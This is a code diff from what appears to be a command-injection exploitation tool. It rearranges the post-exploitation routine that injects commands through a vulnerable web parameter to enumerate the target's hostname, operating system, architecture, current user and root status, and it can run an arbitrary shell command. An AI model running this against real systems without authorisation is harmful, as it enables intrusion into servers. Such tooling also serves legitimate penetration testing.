@@ -29,46 +29,71 @@ from src.core.injections.semiblind_based.techniques.file_based import fb_injecto
 
 def do_check(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,delay):
 
-  # Current user enumeration
-  if menu.options.current_user:
-    cmd = settings.CURRENT_USER
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)			  
-    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
-    if shell:
-      if menu.options.verbose:
-	print ""
-      shell = "".join(str(p) for p in shell)
-      print "  (+) Current User : "+ colors.YELLOW + colors.BOLD + shell + colors.RESET + ""
-
-  # Is-root enumeration
-  if menu.options.is_root:
-    cmd = settings.ISROOT
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)			  
-    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
-    if shell:
-      sys.stdout.write( "  (+) Current user is root :")
-      sys.stdout.flush()
-      shell = "".join(str(p) for p in shell)
-      if shell != "0":
-	print colors.RED + " FALSE "+colors.RESET
-      else:
-	print colors.GREEN + " TRUE "+colors.RESET 
-
   # Hostname enumeration
   if menu.options.hostname:
     cmd = settings.HOSTNAME
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)			  
-    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
+    shell =fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
     if shell:
       if menu.options.verbose:
 	print ""
       shell = "".join(str(p) for p in shell)
-      print "  (+) Hostname : "+ colors.YELLOW + colors.BOLD +  shell + colors.RESET + ""
+      if not menu.options.verbose:
+	print ""
+      sys.stdout.write(colors.BOLD + "(!) The hostname is " + colors.UNDERL + shell + colors.RESET + ".")
+      sys.stdout.flush()
       
+  # "Retrieve certain system information (operating system, hardware platform)
+  if menu.options.sys_info:
+    cmd = settings.RECOGNISE_OS	    
+    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
+    target_os =fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    if target_os:
+      target_os = "".join(str(p) for p in target_os)
+      if target_os == "Linux":
+	cmd = settings.RECOGNISE_HP
+	response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
+	target_arch =fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+	if target_arch:
+	  print ""
+	  target_arch = "".join(str(p) for p in target_arch)
+	  sys.stdout.write(colors.BOLD + "(!) The target operating system is " + colors.UNDERL + target_os + colors.RESET)
+	  sys.stdout.write(colors.BOLD + " and the hardware platform is " + colors.UNDERL + target_arch + colors.RESET + ".")
+	  sys.stdout.flush()
+      else:
+	sys.stdout.write(colors.BOLD + "(!) The target operating system is " + colors.UNDERL + target_os + colors.RESET + ".")
+	sys.stdout.flush()
+
+  # The current user enumeration
+  if menu.options.current_user:
+    cmd = settings.CURRENT_USER
+    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
+    cu_account =fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+    if cu_account:
+      cu_account = "".join(str(p) for p in cu_account)
+      # Check if the user have super privilleges.
+      if menu.options.is_root:
+	cmd = settings.ISROOT
+	response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
+	shell =fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+	if shell:
+	  shell = "".join(str(p) for p in shell)
+	  sys.stdout.write(colors.BOLD + "\n(!) The current user is " + colors.UNDERL + cu_account + colors.RESET)
+	  if shell != "0":
+	      sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "not" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".")
+	      sys.stdout.flush()
+	  else:
+	    sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".")
+	    sys.stdout.flush()
+      else:
+	sys.stdout.write(colors.BOLD + "\n(!) The current user is " + colors.UNDERL + cu_account + colors.RESET + ".")
+	sys.stdout.flush()
+	
+  print ""
   # Single os-shell execution
   if menu.options.os_shell:
     cmd =  menu.options.os_shell
-    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)		  
+    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
     shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
     if shell:
       if menu.options.verbose:
@@ -76,5 +101,5 @@ def do_check(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_pa
       shell = "".join(str(p) for p in shell)
       print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET
       sys.exit(0)
-    
+
 # eof
